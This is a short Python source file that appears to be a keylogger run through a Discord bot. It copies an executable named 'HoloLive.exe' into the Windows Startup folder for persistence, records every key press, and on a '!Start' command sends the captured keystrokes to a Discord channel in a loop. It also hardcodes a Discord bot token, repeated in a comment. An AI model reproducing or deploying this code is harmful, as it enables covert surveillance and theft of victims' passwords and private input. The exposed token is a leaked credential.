import keyboard
import discord
import os
import shutil

intents = discord.Intents.all()
client = discord.Client(intents=intents)
connect = False
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
try:
    shutil.copy('.\dist\HoloLive\HoloLive.exe', startup_folder)
except:
    pass
key = []

def on_key_press(event):
    print(f'Tecla pressionada: {event.name}')
    key.append(event.name)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
    connect = True

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!Start'):
        await message.channel.send('Bot iniciado!')
        keyboard.on_press(on_key_press)
        while True:
            await message.channel.send(f"{key}")

while connect == False:
    try:
        client.run('MTA2NDYzOTQ4ODI4MzkxODM3Ng.GALGpQ.3l1ztVOcvtL_BfrAy6H7MyalmSOWbr3v5iCgB8')
    except:
        pass


#MTA2NDYzOTQ4ODI4MzkxODM3Ng.GALGpQ.3l1ztVOcvtL_BfrAy6H7MyalmSOWbr3v5iCgB8
